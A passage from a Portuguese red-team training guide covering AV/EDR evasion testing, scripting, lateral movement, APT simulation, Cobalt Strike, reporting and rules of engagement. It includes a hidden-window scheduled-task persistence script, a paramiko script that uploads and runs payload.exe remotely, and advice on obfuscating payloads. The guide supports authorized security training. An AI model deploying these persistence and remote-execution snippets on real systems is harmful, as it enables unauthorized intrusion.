+- Documente os métodos usados para replicar e aprimorar ataques  
+
+---
+
+ ✅ Conclusão
+
+Dominar técnicas de evasão contra sandbox e análise estática/dinâmica é vital para o Red Team N2 garantir ataques mais furtivos, dificultando a detecção e análise por equipes de defesa.
+
+---
+
+ 🔴 Red Team N2: Prática – Testar Evasão de Payloads Contra Ferramentas de Defesa
+
+Realizar testes práticos de evasão de payloads contra antivírus, EDRs e sandboxes é fundamental para validar a eficácia das técnicas e melhorar a furtividade dos ataques.
+
+---
+
+ 🧠 Objetivos da prática
+
+- Avaliar se payloads criados conseguem escapar da detecção  
+- Testar diferentes métodos de obfuscação e encoding  
+- Analisar o comportamento das ferramentas de defesa diante do payload  
+- Ajustar técnicas para melhorar a evasão  
+
+---
+
+ 🧱 Pré-requisitos
+
+```
+
+- Ambiente de laboratório controlado com ferramentas de defesa instaladas (antivírus, EDR, sandbox)  
+- Payloads criados com diferentes níveis de obfuscação  
+- Ferramentas para monitorar detecção e resposta (logs, alertas)  
+
+---
+
+ 🔍 Passo a passo sugerido
+
+```
+
+1. Prepare o ambiente com as soluções de segurança ativas  
+2. Execute o payload original e registre o comportamento e detecção  
+3. Aplique técnicas de obfuscação/encoding no payload (ex: Veil-Evasion, msfvenom encoders)  
+4. Reexecute o payload obfuscado e compare os resultados  
+5. Teste variações adicionais como delay na execução, checks de ambiente  
+6. Documente quais técnicas foram mais eficazes para evasão  
+
+---
+
+ ⚙️ Cuidados importantes
+
+```
+
+- Use ambientes isolados para evitar impacto em sistemas produtivos  
+- Mantenha controle rigoroso sobre payloads e resultados  
+- Respeite políticas de segurança e autorizações para testes  
+- Faça backup e snapshots para restaurar o ambiente rapidamente  
+
+---
+
+ ✅ Benefícios da prática
+
+- Melhora a qualidade e furtividade dos payloads  
+- Identifica pontos fracos nas técnicas de evasão  
+- Aprimora conhecimento sobre funcionamento de ferramentas de defesa  
+- Prepara o Red Team para ataques mais sofisticados e realistas  
+
+---
+
+ ✅ Conclusão
+
+Testar evasão de payloads contra ferramentas de defesa é uma etapa essencial para o Red Team N2 validar e aprimorar suas técnicas, garantindo maior sucesso em operações ofensivas.
+
+---
+
+ 🔴 Red Team N2: Programação Básica em Python e PowerShell para Automação
+
+Dominar noções básicas de programação em Python e PowerShell é fundamental para o Red Team N2 automatizar tarefas repetitivas, criar scripts personalizados e aumentar a eficiência das operações.
+
+---
+
+ 🧠 Por que aprender Python e PowerShell?
+
+```
+
+- **Python:** linguagem versátil, fácil de aprender e amplamente usada para automação, análise de dados e desenvolvimento de ferramentas ofensivas  
+- **PowerShell:** shell e linguagem de script poderosa para administração e automação em ambientes Windows, essencial para manipular sistemas-alvo  
+
+---
+
+ 🧱 Conceitos básicos em Python
+
+```
+
+- Variáveis e tipos de dados (string, int, lista, dicionário)  
+- Estruturas de controle (if, for, while)  
+- Funções e módulos  
+- Manipulação de arquivos e entrada/saída  
+- Bibliotecas úteis: `os`, `sys`, `subprocess`, `requests`  
+
+---
+
+ 🧱 Conceitos básicos em PowerShell
+
+```
+
+- Cmdlets e sintaxe básica  
+- Variáveis e tipos de dados  
+- Condicionais e loops  
+- Funções e scripts  
+- Manipulação de arquivos, serviços e processos  
+
+---
+
+ 🔍 Exemplos simples
+
+```
+
+ Python: listar arquivos em um diretório
+
+```python
+import os
+
+for arquivo in os.listdir('.'):
+    print(arquivo)
+```
+
+ PowerShell: listar processos ativos
+
+```powershell
+Get-Process | Select-Object -Property Id, ProcessName
+```
+
+---
+
+ ⚙️ Dicas para Red Team N2
+
+```
+
+- Pratique criando scripts para automatizar tarefas diárias (ex: coleta de informações, varredura)  
+- Use scripts para integração com APIs e ferramentas de segurança  
+- Teste scripts em ambientes controlados antes de usar em operações reais  
+- Documente scripts e mantenha versão controlada  
+
+---
+
+ ✅ Conclusão
+
+Aprender programação básica em Python e PowerShell capacita o Red Team N2 a desenvolver automações eficientes, facilitando ataques sofisticados e otimizando o tempo durante as operações.
+
+---
+
+ 🔴 Red Team N2: Scripts para Coleta de Informações, Exploração e Pós-Exploração
+
+Automatizar tarefas com scripts é essencial para agilizar operações de Red Team, desde a coleta inicial até a exploração e manutenção do acesso em sistemas-alvo.
+
+---
+
+ 🧠 Por que usar scripts?
+
+```
+
+- Aumentam a eficiência e rapidez das etapas de ataque  
+- Reduzem erros humanos em tarefas repetitivas  
+- Permitem customização para diferentes ambientes e alvos  
+- Facilitam integração com outras ferramentas e frameworks  
+
+---
+
+ 🧱 Fases e exemplos de scripts
+
+```
+
+ 1. Coleta de Informações
+
+- Enumerar usuários, serviços e processos  
+- Obter configurações de rede e sistema  
+- Identificar vulnerabilidades básicas  
+
+ Exemplo PowerShell: listar usuários locais
+
+```powershell
+Get-LocalUser | Select-Object Name, Enabled
+```
+
+ Exemplo Python: coletar informações de rede
+
+```python
+import socket
+
+hostname = socket.gethostname()
+ip = socket.gethostbyname(hostname)
+print(f"Hostname: {hostname}, IP: {ip}")
+```
+
+---
+
+ 2. Exploração
+
+- Executar payloads e exploits automatizados  
+- Realizar ataques de força bruta ou injeção  
+- Manipular serviços para obter acesso  
+
+ Exemplo PowerShell: habilitar WinRM para acesso remoto
+
+```powershell
+Enable-PSRemoting -Force
+```
+
+---
+
+ 3. Pós-Exploração
+
+- Criar persistência (tarefas agendadas, serviços)  
+- Coletar credenciais e informações sensíveis  
+- Movimentação lateral e escalonamento de privilégios  
+
+ Exemplo PowerShell: criar tarefa agendada para persistência
+
+```powershell
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File C:\Scripts\payload.ps1"
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "PersistenciaPayload" -Description "Persistência para Red Team"
+```
+
+---
+
+ ⚙️ Dicas para Red Team N2
+
+```
+
+- Teste scripts em ambientes isolados antes de usar em produção  
+- Documente cada script, função e parâmetro para facilitar manutenção  
+- Customize scripts para os alvos e cenários específicos  
+- Combine scripts com outras técnicas para aumentar o sucesso das operações  
+
+---
+
+ ✅ Conclusão
+
+Dominar scripts para coleta, exploração e pós-exploração é fundamental para o Red Team N2 operar com agilidade e precisão, potencializando o impacto das campanhas ofensivas.
+
+---
+
+ 🔴 Red Team N2: Prática – Criar Scripts para Facilitar Ataques e Movimentação Lateral
+
+Automatizar tarefas ofensivas com scripts é essencial para agilizar ataques e ampliar o alcance dentro da rede alvo, facilitando a movimentação lateral e a manutenção do acesso.
+
+---
+
+ 🧠 Objetivos da prática
+
+- Desenvolver scripts para automatizar a execução de ataques comuns  
+- Facilitar a coleta de informações durante movimentação lateral  
+- Criar persistência e escalonamento de privilégios automatizados  
+- Melhorar eficiência e furtividade das operações  
+
+---
+
+ 🧱 Pré-requisitos
+
+```
+
+- Conhecimentos básicos em Python e PowerShell  
+- Ambiente de laboratório isolado com máquinas Windows/Linux  
+- Ferramentas de ataque disponíveis para integração (ex: Metasploit, PsExec)  
+
+---
+
+ 🔍 Exemplos de scripts para prática
+
+```
+
+ 1. Script PowerShell para listar máquinas na rede e verificar portas abertas
+
+```powershell
+$computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
+foreach ($comp in $computers) {
+    Write-Host "Verificando $comp..."
+    Test-NetConnection -ComputerName $comp -Port 445 -InformationLevel Quiet
+}
+```
+
+ 2. Script Python para copiar arquivos remotamente e executar comandos
+
+```python
+import paramiko
+
+hostname = '192.168.1.100'
+username = 'user'
+password = 'pass'
+
+ssh = paramiko.SSHClient()
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+ssh.connect(hostname, username=username, password=password)
+
+sftp = ssh.open_sftp()
+sftp.put('payload.exe', 'C:\\Windows\\Temp\\payload.exe')
+sftp.close()
+
+stdin, stdout, stderr = ssh.exec_command('C:\\Windows\\Temp\\payload.exe')
+print(stdout.read().decode())
+
+ssh.close()
+```
+
+---
+
+ ⚙️ Dicas para Red Team N2
+
+```
+
+- Teste scripts em ambientes controlados antes de usar em operações reais  
+- Mantenha scripts modulares para facilitar ajustes e reutilização  
+- Adicione logging para acompanhar execuções e erros  
+- Integre scripts com ferramentas e frameworks para operações coordenadas  
+
+---
+
+ ✅ Benefícios da prática
+
+- Acelera execução de ataques e movimentação lateral  
+- Reduz esforço manual e erros durante campanhas complexas  
+- Permite ataques mais furtivos e adaptados ao ambiente alvo  
+- Facilita documentação e replicação das técnicas usadas  
+
+---
+
+ ✅ Conclusão
+
+Criar scripts para facilitar ataques e movimentação lateral é uma habilidade essencial para o Red Team N2, aumentando a eficácia e agilidade das operações ofensivas.
+
+---
+
+ 🔴 Red Team N2: Planejamento e Execução de Testes de Penetração Completos
+
+Realizar testes de penetração completos exige planejamento detalhado e execução disciplinada para identificar vulnerabilidades, explorar falhas e gerar recomendações eficazes.
+
+---
+
+ 🧠 Por que planejar antes de executar?
+
+```
+
+- Define escopo e objetivos claros para o teste  
+- Garante conformidade legal e alinhamento com stakeholders  
+- Otimiza uso de recursos e tempo durante o teste  
+- Melhora qualidade dos resultados e documentação  
+
+---
+
+ 🧱 Etapas do planejamento
+
+```
+
+1. **Definição do escopo**: sistemas, redes, aplicações e limites  
+2. **Coleta de informações preliminar**: dados públicos, arquitetura, políticas  
+3. **Avaliação de riscos e autorizações**: garantir legalidade e segurança  
+4. **Seleção de ferramentas e técnicas**: baseadas no escopo e objetivos  
+5. **Cronograma e divisão de tarefas**: organizar a equipe e fases do teste  
+
+---
+
+ 🧱 Execução do teste
+
+```
+
+1. **Reconhecimento:** coleta ativa e passiva de informações  
+2. **Enumeração:** identificação de serviços, usuários e recursos  
+3. **Exploração:** aproveitamento de vulnerabilidades encontradas  
+4. **Pós-exploração:** manutenção de acesso, movimentação lateral e coleta de dados  
+5. **Limpeza:** remoção de artefatos e restauração do ambiente  
+
+---
+
+ 🔍 Documentação e relatório
+
+```
+
+- Registre todas as descobertas, métodos e evidências  
+- Avalie o impacto e risco de cada vulnerabilidade  
+- Proponha recomendações práticas e priorizadas  
+- Entregue relatório claro para times técnicos e executivos  
+
+---
+
+ ⚙️ Dicas para Red Team N2
+
+```
+
+- Mantenha comunicação constante com stakeholders  
+- Use ambientes controlados para evitar impactos negativos  
+- Teste técnicas e ferramentas antes da execução oficial  
+- Aprenda com cada teste para aprimorar processos futuros  
+
+---
+
+ ✅ Conclusão
+
+Planejar e executar testes de penetração completos é fundamental para o Red Team N2 identificar riscos reais e contribuir para a segurança da organização de forma profissional e efetiva.
+
+---
+
+ 🔴 Red Team N2: Técnicas de Ataque Multi-Fase e Simulações de Ameaças Avançadas (APT)
+
+Para atuar em um nível avançado, o Red Team N2 deve dominar técnicas de ataque multi-fase, simulando ameaças persistentes avançadas (APT) que replicam ataques reais e sofisticados contra organizações.
+
+---
+
+ 🧠 O que são ataques multi-fase e APT?
+
+```
+
+- **Ataque multi-fase:** sequência coordenada de ações ofensivas que evoluem para alcançar objetivos complexos  
+- **APT (Advanced Persistent Threat):** ameaça sofisticada e contínua, geralmente patrocinada por grupos com recursos e motivação elevados  
+
+---
+
+ 🧱 Fases típicas de um ataque APT
+
+```
+
+1. **Reconhecimento:** coleta detalhada de informações sobre o alvo  
+2. **Intrusão inicial:** exploração de vulnerabilidades para ganho de acesso inicial  
+3. **Estabelecimento de persistência:** criação de backdoors e métodos para manter acesso  
+4. **Movimentação lateral:** exploração da rede para ampliar controle  
+5. **Coleta de dados e exfiltração:** obtenção e saída de informações sensíveis  
+6. **Evasão e ocultação:** uso de técnicas para evitar detecção durante todo o processo  
+
+---
+
+ 🧱 Técnicas avançadas usadas
+
+```
+
+- Uso de phishing direcionado (spear phishing) com payloads customizados  
+- Exploração zero-day e vulnerabilidades desconhecidas  
+- Obfuscação e criptografia para evasão de defesas  
+- Uso de canais de comunicação cifrados e disfarçados  
+- Manipulação de ferramentas legítimas (Living off the Land) para ataques furtivos  
+
+---
+
+ 🔍 Como simular ataques APT no Red Team
+
+```
+
+- Planejar múltiplas fases alinhadas com objetivos reais da organização  
+- Utilizar ferramentas sofisticadas como Cobalt Strike e PowerShell Empire  
+- Combinar técnicas manuais com automatizadas para maior eficácia  
+- Testar capacidades de detecção e resposta do Blue Team em ambientes controlados  
+
+---
+
+ ⚙️ Dicas para Red Team N2
+
+```
+
+- Estude casos reais de APT para entender táticas, técnicas e procedimentos (TTPs)  
+- Mantenha-se atualizado com as últimas vulnerabilidades e exploits  
+- Desenvolva e pratique em laboratórios avançados com múltiplos cenários  
+- Documente detalhadamente cada fase e resultado para análise pós-ação  
+
+---
+
+ ✅ Conclusão
+
+Dominar técnicas de ataque multi-fase e simular ameaças APT é essencial para o Red Team N2 realizar avaliações de segurança profundas, preparando organizações para enfrentar adversários reais e sofisticados.
+
+---
+
+ 🔴 Red Team N2: Ferramentas Avançadas – Cobalt Strike e BloodHound
+
+Para realizar ataques sofisticados e mapeamento detalhado de redes, o Red Team N2 deve dominar ferramentas avançadas como Cobalt Strike e BloodHound, que são padrão da indústria em operações ofensivas.
+
+---
+
+ 🧠 Por que usar essas ferramentas?
+
+```
+
+- **Cobalt Strike:** plataforma robusta para pós-exploração, comando e controle, e execução de payloads altamente customizáveis  
+- **BloodHound:** ferramenta para mapeamento e análise de relações e permissões em ambientes Active Directory, facilitando movimentação lateral  
+
+---
+
+ 🧱 Cobalt Strike – principais funcionalidades
+
+```
+
+- Implantação de beacons para comunicação furtiva  
+- Execução de comandos remotos e scripts pós-exploração  
+- Suporte a técnicas avançadas de evasão e persistência  
+- Integração com exploits e ferramentas externas  
+- Interface gráfica amigável para controle em tempo real  
+
+🔗 [https://www.cobaltstrike.com/](https://www.cobaltstrike.com/)
+
+---
+
+ 🧱 BloodHound – principais funcionalidades
+
+```
+
+- Mapeamento das relações entre usuários, computadores, grupos e permissões no AD  
+- Visualização gráfica para identificar caminhos de escalonamento e movimentação lateral  
+- Suporte a queries customizadas para investigação detalhada  
+- Uso de dados coletados por agentes ou scripts em PowerShell  
+
+🔗 [https://bloodhound.readthedocs.io/](https://bloodhound.readthedocs.io/)
+
+---
+
+ 🔍 Como usar em conjunto
+
+```
+
+- Use BloodHound para planejar rotas de movimentação lateral e escalonamento de privilégios  
+- Implante Cobalt Strike para executar e manter o controle sobre os hosts-alvo  
+- Combine dados do BloodHound para priorizar ataques e evitar detecção  
+- Execute campanhas coordenadas para simular ataques reais e sofisticados  
+
+---
+
+ ⚙️ Dicas para Red Team N2
+
+```
+
+- Pratique em ambientes de laboratório com Active Directory realista  
+- Aprenda a interpretar gráficos e dados do BloodHound para tomada de decisão  
+- Explore scripts e módulos do Cobalt Strike para customizar ataques  
+- Atualize-se com as últimas versões e técnicas para essas ferramentas  
+
+---
+
+ ✅ Conclusão
+
+Dominar Cobalt Strike e BloodHound capacita o Red Team N2 a realizar ataques precisos, furtivos e eficazes, ampliando significativamente o impacto das operações ofensivas.
+
+---
+
+ 🔴 Red Team N2: Prática – Conduzir um Pentest Simulado Completo
+
+Realizar um pentest simulado completo é uma excelente forma de aplicar conhecimentos, testar ferramentas e processos, e aprimorar habilidades práticas em um ambiente controlado.
+
+---
+
+ 🧠 Objetivos da prática
+
+- Executar todas as fases de um teste de penetração realista  
+- Identificar vulnerabilidades e explorar falhas de segurança  
+- Documentar descobertas e gerar relatório técnico e executivo  
+- Desenvolver comunicação e planejamento durante o processo  
+
+---
+
+ 🧱 Pré-requisitos
+
+```
+
+- Ambiente de laboratório configurado (redes, servidores, máquinas alvo)  
+- Ferramentas básicas e avançadas de pentest instaladas  
+- Permissão formal para realizar o teste  
+- Conhecimento em metodologias de pentest (ex: PTES, OWASP)  
+
+---
+
+ 🔍 Passo a passo sugerido
+
+```
+
+1. **Planejamento e escopo:** defina objetivos, limites e regras de engajamento  
+2. **Reconhecimento:** colete informações públicas e passivas sobre o alvo  
+3. **Enumeração:** identifique serviços, portas abertas e usuários  
+4. **Exploração:** execute ataques e explore vulnerabilidades encontradas  
+5. **Pós-exploração:** obtenha persistência, movimente-se lateralmente e colete dados  
+6. **Limpeza:** remova artefatos e restaure o ambiente  
+7. **Documentação:** registre todas as ações, evidências e recomendações  
+8. **Relatório:** prepare e apresente um relatório claro para stakeholders técnicos e executivos  
+
+---
+
+ ⚙️ Dicas para Red Team N2
+
+```
+
+- Mantenha comunicação constante com o time e stakeholders durante o teste  
+- Use ferramentas de automação para acelerar etapas repetitivas  
+- Documente minuciosamente cada fase para facilitar o relatório final  
+- Pratique a ética e respeite as regras definidas no escopo  
+
+---
+
+ ✅ Benefícios da prática
+
+- Consolida conhecimentos teóricos e práticos  
+- Melhora a confiança e capacidade de execução em situações reais  
+- Ajuda a identificar gaps pessoais e de processo para evolução contínua  
+- Fortalece a habilidade de produzir documentação profissional  
+
+---
+
+ ✅ Conclusão
+
+Conduzir um pentest simulado completo prepara o Red Team N2 para atuar com eficiência, profissionalismo e responsabilidade em avaliações reais, promovendo a segurança da organização.
+
+---
+
+ 🔴 Red Team N2: Como Documentar Ataques e Vulnerabilidades
+
+Documentar ataques e vulnerabilidades é uma etapa fundamental para garantir que os resultados do Red Team sejam compreendidos, replicáveis e utilizados para fortalecer a segurança da organização.
+
+---
+
+ 🧠 Por que documentar?
+
+```
+
+- Facilita o entendimento das falhas exploradas  
+- Permite replicação e correção eficiente das vulnerabilidades  
+- Suporta comunicação clara com equipes técnicas e executivas  
+- Serve como base para relatórios, auditorias e treinamentos  
+
+---
+
+ 🧱 O que incluir na documentação
+
+```
+
+- **Contexto do ataque:** objetivo, escopo, ambiente  
+- **Descrição da vulnerabilidade:** tipo, impacto, CVE se aplicável  
+- **Passo a passo do ataque:** comandos, técnicas e ferramentas usadas  
+- **Evidências:** capturas de tela, logs, outputs relevantes  
+- **Riscos e impacto:** consequências possíveis para a organização  
+- **Recomendações:** medidas corretivas e preventivas  
+
+---
+
+ 🔍 Estrutura recomendada para relatórios
+
+```
+
+1. **Resumo Executivo:** visão geral simples para gestores  
+2. **Introdução:** contexto, objetivos e escopo do teste  
+3. **Metodologia:** técnicas e ferramentas usadas  
+4. **Descobertas:** detalhamento das vulnerabilidades exploradas  
+5. **Análise de Risco:** classificação e impacto das falhas  
+6. **Recomendações:** sugestões para mitigação  
+7. **Conclusão:** resumo final e próximos passos  
+
+---
+
+ ⚙️ Boas práticas
+
+```
+
+- Seja claro e objetivo, evitando jargões excessivos  
+- Use linguagem técnica para o time de segurança e mais simples para executivos  
+- Documente imediatamente após cada fase do ataque para evitar perdas  
+- Inclua evidências visuais sempre que possível  
+- Revise e valide a documentação antes da entrega  
+
+---
+
+ ✅ Conclusão
+
+Uma documentação bem feita é crucial para que as vulnerabilidades identificadas sejam compreendidas, tratadas e usadas para melhorar a postura de segurança da organização.
+
+---
+
+ 🔴 Red Team N2: Produzir Relatórios Claros, Técnicos e Executivos
+
+A habilidade de produzir relatórios claros e bem estruturados é essencial para o Red Team N2, garantindo que os resultados do pentest sejam compreendidos por todos os públicos, desde técnicos até executivos.
+
+---
+
+ 🧠 Por que adaptar relatórios para públicos diferentes?
+
+```
+
+- Facilita a comunicação eficaz entre times técnicos e gestores  
+- Garante que decisões sejam tomadas com base em informações claras  
+- Evita mal-entendidos e interpretações erradas dos resultados  
+- Promove maior engajamento e apoio para ações corretivas  
+
+---
+
+ 🧱 Tipos de relatórios e seus focos
+
+```
+
+ 1. Relatório Técnico
+
+- Detalha vulnerabilidades, técnicas usadas, evidências e comandos  
+- Público: analistas de segurança, desenvolvedores e técnicos  
+- Linguagem: técnica e detalhada  
+- Inclui: logs, screenshots, código, detalhes de exploração  
+
+ 2. Relatório Executivo
+
+- Apresenta visão geral, riscos, impacto e recomendações  
+- Público: gestores, diretores e decisores  
+- Linguagem: clara, objetiva e livre de jargões técnicos  
+- Inclui: resumo do teste, principais descobertas, impacto nos negócios e sugestões de mitigação  
+
+---
+
+ 🔍 Estrutura recomendada para relatórios
+
+```
+
+1. **Resumo Executivo (para relatório executivo)**  
+2. **Introdução e Escopo**  
+3. **Metodologia**  
+4. **Descobertas Técnicas (detalhadas no relatório técnico)**  
+5. **Análise de Riscos**  
+6. **Recomendações**  
+7. **Conclusão e Próximos Passos**  
+8. **Apêndices (logs, scripts, evidências)**  
+
+---
+
+ ⚙️ Boas práticas para redação
+
+```
+
+- Use linguagem simples e objetiva no relatório executivo  
+- Seja detalhado e preciso no relatório técnico  
+- Utilize gráficos e tabelas para facilitar compreensão  
+- Destaque as vulnerabilidades críticas e seus impactos  
+- Revise cuidadosamente para evitar erros e ambiguidades  
+- Mantenha confidencialidade e segurança das informações  
+
+---
+
+ ✅ Conclusão
+
+Produzir relatórios claros e adaptados aos diferentes públicos é uma competência essencial para o Red Team N2, que impacta diretamente na eficácia da comunicação e na resposta às vulnerabilidades identificadas.
+
+---
+
+ 🔴 Red Team N2: Preparação para Apresentar Resultados para Equipes Técnicas e Executivas
+
+Apresentar os resultados de um pentest de forma eficaz é tão importante quanto a execução do teste. Saber adaptar a comunicação para diferentes públicos potencializa o impacto das descobertas.
+
+---
+
+ 🧠 Por que preparar apresentações específicas?
+
+```
+
+- Facilita o entendimento e engajamento dos diferentes públicos  
+- Evita sobrecarregar executivos com detalhes técnicos desnecessários  
+- Garante que equipes técnicas recebam informações precisas e acionáveis  
+- Ajuda a alinhar expectativas e planejar ações corretivas  
+
+---
+
+ 🧱 Diferenças na abordagem
+
+```
+
+ Para equipes técnicas
+
+- Foque em detalhes técnicos, métodos usados, evidências e recomendações práticas  
+- Utilize termos técnicos e exemplos reais do teste  
+- Prepare-se para perguntas detalhadas e discussões técnicas  
+
+ Para equipes executivas
+
+- Apresente um resumo claro dos riscos, impactos e prioridades  
+- Use linguagem acessível, gráficos e métricas de negócio  
+- Destaque benefícios e retorno sobre investimento para correções  
+
+---
+
+ 🔍 Dicas para apresentação
+
+```
+
+- Estruture a apresentação com agenda clara e objetivos definidos  
+- Use slides limpos, com textos curtos e visualizações impactantes  
+- Prepare respostas para possíveis dúvidas e objeções  
+- Seja objetivo e mantenha o foco nos pontos mais relevantes para cada público  
+- Pratique a apresentação para ganhar confiança e fluidez  
+
+---
+
+ ⚙️ Ferramentas úteis
+
+```
+
+- PowerPoint, Google Slides para criação dos slides  
+- Ferramentas de visualização de dados (Excel, Tableau, Grafana)  
+- Softwares de gravação para apresentar remotamente, se necessário  
+
+---
+
+ ✅ Conclusão
+
+Uma boa preparação para apresentar resultados permite que o Red Team N2 comunique suas descobertas de forma clara, influenciando positivamente as decisões e ações da organização.
+
+---
+
+ 🔴 Red Team N2: Prática – Elaborar Relatório e Apresentação para Stakeholders
+
+Elaborar um relatório detalhado e uma apresentação clara para stakeholders é fundamental para garantir que os resultados do Red Team sejam compreendidos e as ações necessárias sejam implementadas.
+
+---
+
+ 🧠 Objetivos da prática
+
+```
+
+- Criar documentação técnica detalhada para equipes de segurança  
+- Produzir um resumo executivo acessível para gestores e diretores  
+- Desenvolver uma apresentação clara, objetiva e impactante  
+- Aprender a comunicar riscos, impactos e recomendações  
+
+---
+
+ 🧱 Passos para elaboração do relatório
+
+```
+
+1. Organize as descobertas por criticidade e impacto  
+2. Documente métodos, evidências e comandos usados  
+3. Redija recomendações práticas e prioridades de correção  
+4. Revise para clareza, precisão e profissionalismo  
+
+---
+
+ 🔍 Estrutura sugerida para apresentação
+
+```
+
+- **Introdução:** contexto e objetivos do teste  
+- **Resumo Executivo:** principais descobertas e impactos  
+- **Detalhes Técnicos:** vulnerabilidades, explorações e evidências  
+- **Análise de Risco:** avaliação e classificação das falhas  
+- **Recomendações:** ações prioritárias e mitigação  
+- **Perguntas e Discussão:** abrir espaço para dúvidas  
+
+---
+
+ ⚙️ Dicas para a apresentação
+
+```
+
+- Use slides limpos, com textos curtos e gráficos explicativos  
+- Adapte a linguagem conforme o público (técnico ou executivo)  
+- Ensaie para garantir fluidez e domínio do conteúdo  
+- Prepare-se para responder perguntas e discutir soluções  
+
+---
+
+ ✅ Benefícios da prática
+
+```
+
+- Melhora a capacidade de comunicação técnica e executiva  
+- Fortalece a credibilidade do Red Team perante a organização  
+- Facilita a tomada de decisão e ações corretivas rápidas  
+- Desenvolve habilidades essenciais para crescimento profissional  
+
+---
+
+ ✅ Conclusão
+
+Praticar a elaboração de relatórios e apresentações para stakeholders prepara o Red Team N2 para transmitir resultados de forma eficaz, aumentando o impacto e valor das avaliações de segurança.
+
+---
+
+ 🔴 Red Team N2: Conhecer MITRE ATT&CK para Mapear Técnicas Ofensivas
+
+O framework MITRE ATT&CK é uma base essencial para o Red Team entender, mapear e planejar técnicas ofensivas de forma estruturada, alinhada com ameaças reais e reconhecidas mundialmente.
+
+---
+
+ 🧠 O que é o MITRE ATT&CK?
+
+```
+
+- Um banco de dados global de técnicas, táticas e procedimentos (TTPs) usados por adversários  
+- Organizado em matrizes que cobrem diferentes fases do ciclo de ataque, como Reconhecimento, Execução, Persistência, etc.  
+- Facilita a compreensão do comportamento do atacante e a criação de simulações realistas  
+
+---
+
+ 🧱 Benefícios para o Red Team
+
+```
+
+- Planejamento de ataques alinhados a técnicas conhecidas e atuais  
+- Identificação de lacunas em defesas e detecção  
+- Comunicação clara com o Blue Team usando uma linguagem padrão  
+- Melhoria contínua das táticas com base em ameaças reais  
+
+---
+
+ 🔍 Como usar o MITRE ATT&CK na prática
+
+```
+
+- Estude as táticas e técnicas relevantes para seu escopo de atuação  
+- Mapear ferramentas e exploits às técnicas do framework  
+- Utilizar o ATT&CK Navigator para planejar campanhas e simulações  
+- Documentar ataques e relatórios referenciando as técnicas usadas  
+
+---
+
+ ⚙️ Dicas para Red Team N2
+
+```
+
+- Familiarize-se com as matrizes Enterprise, Mobile e ICS conforme seu foco  
+- Atualize-se com as novas técnicas e atualizações do framework  
+- Combine o MITRE ATT&CK com outras fontes de inteligência de ameaças  
+- Use ferramentas que suportem integração com ATT&CK para análise e visualização  
+
+---
+
+ ✅ Conclusão
+
+Conhecer e aplicar o MITRE ATT&CK permite ao Red Team N2 realizar avaliações ofensivas mais realistas, efetivas e alinhadas às ameaças atuais, fortalecendo a segurança da organização.
+
+---
+
+ 🔴 Red Team N2: Entender Normas e Padrões Aplicáveis (NIST, ISO 27001)
+
+Conhecer normas e padrões de segurança da informação é fundamental para o Red Team N2 alinhar suas práticas às exigências regulatórias e melhores práticas do mercado, garantindo credibilidade e conformidade.
+
+---
+
+ 🧠 Por que entender normas e padrões?
+
+```
+
+- Ajuda a identificar controles obrigatórios e recomendados  
+- Facilita o alinhamento das avaliações e relatórios com requisitos legais  
+- Melhora a comunicação com equipes de compliance e auditoria  
+- Garante que os testes considerem políticas e procedimentos internos  
+
+---
+
+ 🧱 Principais normas e frameworks
+
+```
+
+ NIST Cybersecurity Framework (CSF)
+
+- Estrutura orientada a gestão de riscos em segurança cibernética  
+- Composto por cinco funções: Identificar, Proteger, Detectar, Responder e Recuperar  
+- Usado amplamente em setores públicos e privados nos EUA e globalmente  
+
+ ISO/IEC 27001
+
+- Padrão internacional para sistemas de gestão de segurança da informação (SGSI)  
+- Define requisitos para estabelecer, implementar, manter e melhorar a segurança da informação  
+- Foca em controles, avaliação de riscos e melhoria contínua  
+
+---
+
+ 🔍 Como aplicar no Red Team
+
+```
+
+- Entenda os controles de segurança que serão avaliados durante os testes  
+- Use os frameworks para planejar escopo e metodologia dos pentests  
+- Prepare relatórios que considerem os requisitos das normas para facilitar correções  
+- Apoie a equipe de segurança na adequação a normas e auditorias  
+
+---
+
+ ⚙️ Dicas para Red Team N2
+
+```
+
+- Estude os documentos oficiais e resumos dos frameworks para rápida referência  
+- Participe de treinamentos e certificações relacionados (ex: CISSP, CISM)  
+- Utilize checklists baseados em normas para guiar as avaliações  
+- Mantenha-se atualizado sobre mudanças e novas versões das normas  
+
+---
+
+ ✅ Conclusão
+
+Entender normas como NIST CSF e ISO 27001 é essencial para o Red Team N2 atuar com alinhamento estratégico, aumentando o valor das avaliações e contribuindo para a segurança e conformidade organizacional.
+
+---
+
+ 🔴 Red Team N2: Ética, Escopo e Regras de Engajamento em Testes de Invasão
+
+Executar testes de invasão com responsabilidade exige aderência a princípios éticos, definição clara de escopo e regras de engajamento para garantir a segurança e legalidade da operação.
+
+---
+
+ 🧠 Por que ética e escopo são fundamentais?
+
+```
+
+- Protege a integridade da organização e das pessoas envolvidas  
+- Garante que o teste seja legal e autorizado  
+- Evita impactos indesejados e danos aos sistemas  
+- Promove confiança e profissionalismo na atuação do Red Team  
+
+---
+
+ 🧱 Ética em testes de invasão
+
+```
+
+- Sempre obtenha autorização formal e documentada antes de iniciar o teste  
+- Respeite a privacidade e dados sensíveis encontrados durante o trabalho  
+- Informe imediatamente a equipe responsável sobre descobertas críticas que possam causar danos  
+- Evite ações que possam comprometer a disponibilidade dos sistemas sem prévia concordância  
+
+---
+
+ 🔍 Definindo escopo e regras de engajamento
+
+```
+
+- **Escopo:** delimitação clara dos sistemas, redes, aplicativos e recursos que podem ser testados  
+- **Regras de engajamento:** limites operacionais, horários permitidos, técnicas proibidas, comunicação e protocolos de emergência  
+- **Critérios de sucesso e falha:** definição do que caracteriza vulnerabilidades e como reportá-las  
+- **Equipe envolvida:** contatos, responsáveis e autoridades para decisão durante o teste  
+
+---
+
+ ⚙️ Boas práticas para Red Team N2
+
+```
+
+- Documente todo o acordo de escopo e regras antes de iniciar o trabalho  
+- Comunique-se regularmente com o cliente ou equipe de segurança durante o teste  
+- Tenha um plano de resposta para situações inesperadas, como falhas ou interrupções  
+- Garanta a confidencialidade dos resultados e dados coletados  
+
+---
+
+ ✅ Conclusão
+
+A ética, o escopo bem definido e regras claras de engajamento são pilares para que o Red Team N2 realize testes de invasão seguros, eficazes e respeitosos, mantendo a confiança e legalidade em todas as operações.
+
+---
+
+ 🔴 Red Team N2: Prática – Criar Planos de Ataque Alinhados a Frameworks
+
